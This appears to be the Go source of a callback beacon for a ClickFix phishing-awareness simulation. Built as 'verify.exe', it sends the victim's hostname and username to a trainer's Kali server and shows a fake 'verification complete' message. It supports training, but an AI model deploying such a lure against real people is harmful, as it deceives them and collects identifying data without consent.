// beacon.go — BENIGN training callback for a ClickFix phishing simulation.
//
// All this program does is send ONE HTTP GET request back to the training
// (Kali) server to confirm that a user executed it, then prints a fake
// "verification complete" message. It reads no sensitive data, writes nothing
// to disk, installs nothing, and has no persistence or command execution.
//
// The only information reported is the machine hostname and the current
// username, so the trainer knows *who* ran the payload.
//
// Build for Windows on Kali:
//   GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o verify.exe beacon.go

package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"time"
)

// >>> EDIT THIS to your Kali machine's IP and the port server.py listens on.
const kaliServer = "http://10.10.10.10:8000"

func main() {
	hostname, _ := os.Hostname()

	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	q := url.Values{}
	q.Set("host", hostname)
	q.Set("user", username)
	q.Set("ts", time.Now().Format(time.RFC3339))

	callbackURL := kaliServer + "/callback?" + q.Encode()

	client := http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(callbackURL)
	if err != nil {
		// Benign failure — nothing else happens.
		fmt.Println("Verification could not be completed:", err)
		time.Sleep(3 * time.Second)
		return
	}
	defer resp.Body.Close()

	fmt.Println("Verification complete. You may close this window.")
	time.Sleep(3 * time.Second)
}
